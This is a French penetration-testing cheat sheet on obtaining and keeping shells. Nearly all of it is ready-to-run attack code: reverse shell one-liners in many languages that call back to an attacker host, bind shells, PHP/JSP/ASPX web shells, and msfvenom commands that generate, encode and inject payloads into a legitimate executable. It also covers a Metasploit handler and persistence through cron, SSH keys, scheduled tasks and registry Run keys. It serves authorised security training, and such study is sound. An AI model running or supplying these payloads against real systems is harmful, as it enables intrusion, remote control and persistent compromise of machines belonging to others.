# 08 — Shells & Payloads

## Objectifs
Obtenir et stabiliser un shell (reverse, bind, web), générer des payloads (msfvenom), comprendre encodage/obfuscation et les shells interactifs modernes.

---

## 1. Reverse shell — Linux

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# Sh
sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Netcat
nc -e /bin/sh <LHOST> <LPORT>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PHP
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Socat
socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash
```

### Générateur
```bash
# revshells.com / payloadsallthethings
```

---

## 2. Bind shell

```bash
# Linux
nc -lvnp <LPORT> -e /bin/bash
socat TCP-LISTEN:<LPORT>,fork EXEC:/bin/bash

# Windows
nc -lvnp <LPORT> -e cmd.exe

# Connexion
nc <TARGET> <LPORT>
```

> Bind = la cible écoute ; bloqué par les pare-feux entrants. Reverse = la cible sort.

---

## 3. Reverse shell — Windows

```powershell
# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# nc.exe
nc.exe -e cmd.exe <LHOST> <LPORT>

# ConPty / winpty (shell interactif)
```

### HoaxShell (payload PowerShell sans fichier)
```bash
# Install
pip3 install hoaxshell
# Serveur
sudo python3 hoaxshell.py -s <LHOST> -p 8080
# Le script généré est exécuté sur la cible → session interactive
```

---

## 4. Web shells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php $f=file_get_contents($_FILES['f']['tmp_name']);file_put_contents($_FILES['f']['name'],$f); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd()); %>
```

```bash
# Usage
curl "http://<TARGET>/shell.php?cmd=id"
curl -X POST "http://<TARGET>/upload.php" -F "f=@shell.php"
```

### Mini web shell Python (si PHP absent)
```bash
python3 -c "import http.server;..." # ou uploader un script CGI
```

---

## 5. Msfvenom

```bash
# Lister les payloads
msfvenom -l payloads | grep windows
msfvenom -l formats

# Linux reverse
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf

# Windows reverse
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe

# PHP
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx

# Encodage / obfuscation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -i 10 -f exe -o shell.exe

# Injection dans un exe existant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -x putty.exe -k -f exe -o putty_backdoor.exe

# Format script (base64 / powershell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh-reflection -o shell.ps1
```

> Les payloads non stagés (`shell_reverse_tcp`) sont plus simples ; `meterpreter` nécessite `multi/handler`.

---

## 6. Handler Metasploit

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
set ExitOnSession false
run -j
```

---

## 7. Stabilisation du shell

### Linux — TTY complet
```bash
# 1. spawn pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2. Ctrl+Z
stty raw -echo; fg
# 3. env
export TERM=xterm; export SHELL=/bin/bash
stty rows 40 cols 180

# Alternative : script
script -qc /bin/bash /dev/null
```

### Windows — shell interactive
```powershell
# ConPty via winpty / rlwrap
rlwrap nc -lvnp <LPORT>

# Upgrade Meterpreter → shell
shell
# Puis : powershell -ep bypass
```

### Pwncat-cs
```bash
pip install pwncat-cs
pwncat-cs -lp <LPORT>
# Shell fully interactive, upload/download, persist, privesc enumeration
```

---

## 8. Persistance légère (lab / autorisé)

```bash
# Linux — cron
echo '* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | crontab -

# Linux — clé SSH
mkdir -p ~/.ssh && echo "<PUBKEY>" >> ~/.ssh/authorized_keys

# Windows — tâche planifiée
schtasks /create /tn Updater /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM

# Windows — registre Run
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Temp\shell.exe
```

> À documenter et retirer impérativement en fin d'engagement.

---

## 9. Aide-mémoire des ports

```bash
# Listener multi-usage
rlwrap nc -lvnp 443        # 443 passe souvent les pare-feux
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
```

| Type | Avantage | Inconvénient |
|---|---|---|
| Reverse | contourne NAT/firewall entrant | nécessite sortie |
| Bind | simple si port ouvert | bloqué par firewall |
| Web shell | passe le HTTP | peu interactif |
| Meterpreter | riche | signatures AV |

---

## Checklist
- [ ] Listener lancé avant le payload
- [ ] Payload adapté à l'OS/arch
- [ ] Shell stabilisé (TTY)
- [ ] Persistance seulement si autorisée + documentée
- [ ] Nettoyage des binaires et tâches
